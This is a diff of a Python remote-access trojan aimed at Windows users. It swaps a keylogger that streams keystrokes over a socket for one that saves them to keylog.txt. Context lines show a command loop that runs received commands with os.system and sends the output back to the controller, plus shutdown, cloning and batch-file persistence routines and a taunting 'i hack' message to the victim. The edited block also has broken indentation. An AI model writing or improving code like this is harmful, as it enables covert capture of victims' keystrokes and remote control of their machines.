@@ -19,12 +19,15 @@ USER = getuser()
 #used PATHS:
 temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
 
-def keylog(event):
-    keys = []
-    key = event.name
+def functionPK(key):
     keys.append(key)
-    keyToSend = keys
-    conn.send(str(keyToSend + ", ").encode("utf-8"))
+    storeKeysToFile(keys)
+
+def storeKeysToFile(keys):   
+    with open('keylog.txt', 'w') as log:  
+        for the_key in keys:   
+            the_key = str(the_key).replace("'", " ")  
+            log.write(the_key)  
 
 def kill():
     os.system("msg %username% your system will be shutdown because i hack then :) lol")
@@ -73,11 +76,15 @@ while True:
         bat_create()
         clone()
         kill()
+        # Kstay shutdown the sistem. stay dont shutdown
         #re-start the server
     if cmd == "keylog":
-        key.on_press(keylog)
-        key.wait('esc')
-# Kstay shutdown the sistem. stay dont shutdown
+            if(cmd == "keylog"):
+        with Listener(on_press = functionPK) as the_listener:  
+            the_listener.join()
+
+# --------------------------------------------------------------------------------------------------------------------------------------
+
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
